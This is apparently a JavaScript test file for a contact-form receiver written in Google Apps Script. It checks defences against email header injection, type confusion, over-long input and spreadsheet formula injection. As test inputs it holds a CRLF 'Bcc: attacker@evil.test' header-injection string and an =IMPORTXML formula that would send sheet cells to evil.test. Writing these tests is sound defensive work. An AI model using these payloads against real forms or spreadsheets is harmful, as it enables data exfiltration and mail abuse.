/**
 * Checks on the contact-form receiver's input handling.
 *
 * `scripts/google-apps-script.gs` is the only part of this project that runs
 * on a public, unauthenticated URL, and it is the only part that cannot be
 * exercised by loading the site — it lives in Google's runtime, where a
 * mistake is found by someone opening the spreadsheet weeks later. Its pure
 * functions are plain JavaScript though, so they can be loaded and run here.
 *
 * Deliberately dependency-free. Adding a test runner to a project with no
 * tests, to cover one file, would cost more in install weight and config than
 * it returns.
 *
 *   npm test
 */
import { readFileSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { fileURLToPath } from 'node:url'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..')
const source = readFileSync(join(ROOT, 'scripts', 'google-apps-script.gs'), 'utf8')

// The file is written for Apps Script, so it has no exports. Evaluating it and
// naming the functions we want is the least invasive way to reach them — the
// alternative is restructuring production code to suit a test.
const load = new Function(
  'exports',
  `${source}\nObject.assign(exports, { clamp, normalise, firstValidationError, isEmail, LIMITS });`
)
const gas = {}
load(gas)

let passed = 0
let failed = 0

function check(name, actual, expected) {
  const ok = JSON.stringify(actual) === JSON.stringify(expected)
  if (ok) {
    passed++
  } else {
    failed++
    console.error(`FAIL  ${name}`)
    console.error(`        actual   ${JSON.stringify(actual)}`)
    console.error(`        expected ${JSON.stringify(expected)}`)
    return
  }
  console.log(`pass  ${name}`)
}

function group(title) {
  console.log(`\n${title}`)
}

/* ── Email header injection ──────────────────────────────────────────────
   `subject` is interpolated into the notification email's Subject header. A
   bare CRLF there is how a sender tries to add headers of their own — a Bcc
   to somewhere else, or a replacement From. */
group('Control characters cannot reach the notification headers')
check(
  'CRLF in subject collapses to spaces',
  gas.clamp('Enquiry\r\nBcc: attacker@evil.test', 200),
  'Enquiry  Bcc: attacker@evil.test'
)
check('NUL is removed', gas.clamp('ab\u0000cd', 200), 'ab cd')
check('DEL is removed', gas.clamp('ab\u007Fcd', 200), 'ab cd')
check('tab is removed from a single-line field', gas.clamp('a\tb', 200), 'a b')

/* The message body is the one place a line break is content. */
group('The message body keeps its line breaks')
check('newlines survive', gas.clamp('line one\nline two', 200, true), 'line one\nline two')
check('CRLF is normalised to LF', gas.clamp('line one\r\nline two', 200, true), 'line one\nline two')
check('tabs are still removed', gas.clamp('a\tb', 200, true), 'a b')

/* ── Type confusion ──────────────────────────────────────────────────────
   The body is attacker-supplied JSON, so a field can be any JSON type. The
   old code ran String(value) on it, turning a posted object into the literal
   text "[object Object]" in the spreadsheet. */
group('Non-primitives are rejected rather than stringified')
check('object', gas.clamp({ toString: () => 'pwned' }, 200), '')
check('array', gas.clamp(['a', 'b'], 200), '')
check('null', gas.clamp(null, 200), '')
check('number is still accepted', gas.clamp(42, 200), '42')

group('Length is capped server-side')
check('long value is cut to the limit', gas.clamp('A'.repeat(50_000), 10).length, 10)
check(
  'normalise applies the per-field limit',
  gas.normalise({ name: 'A'.repeat(500) }).name.length,
  gas.LIMITS.name
)

/* ── replyTo ─────────────────────────────────────────────────────────────
   An unvalidated address here throws inside MailApp, which used to be caught
   and reported as a failed submission — after the row had already been
   written. The client would then retry and store it twice. */
group('Email validation guards the replyTo header')
check('a normal address', gas.isEmail('someone@example.co'), true)
check('no @', gas.isEmail('not-an-address'), false)
check('an injection attempt', gas.isEmail('a@b.co\r\nBcc: x@y.z'), false)
check('internal spaces', gas.isEmail('a b@c.de'), false)

group('Required fields are enforced server-side, not only in the browser')
check(
  'missing name',
  gas.firstValidationError({ name: '', email: 'a@b.co', message: 'hi' }),
  'Name is required'
)
check(
  'malformed email',
  gas.firstValidationError({ name: 'N', email: 'nope', message: 'hi' }),
  'Email is not valid'
)
check(
  'missing message',
  gas.firstValidationError({ name: 'N', email: 'a@b.co', message: '' }),
  'Message is required'
)
check(
  'a complete enquiry',
  gas.firstValidationError({ name: 'N', email: 'a@b.co', message: 'hi' }),
  null
)

/* ── Spreadsheet formula injection ───────────────────────────────────────
   Note what this asserts: that the payload passes through *unchanged*.
   Escaping it here would be the wrong fix — it would corrupt a legitimate
   message that happens to start with "=" or "-", and it would still be
   bypassable. The defence is `setValuesAsText`, which sets the cell's number
   format to '@' before writing so Sheets stores the characters instead of
   parsing them. This test exists to stop someone "fixing" the sanitiser in a
   way that papers over that and hides a regression in the real control. */
group('Formula payloads reach the sheet as literal text')
const FORMULA = '=IMPORTXML("https://evil.test/?x="&CONCATENATE(A1:I1),"//a")'
check('the payload is not mangled by the sanitiser', gas.clamp(FORMULA, 500), FORMULA)
console.log('      (setValuesAsText + numberFormat "@" is what stops it evaluating)')

console.log(`\n${passed} passed, ${failed} failed`)
process.exit(failed ? 1 : 0)
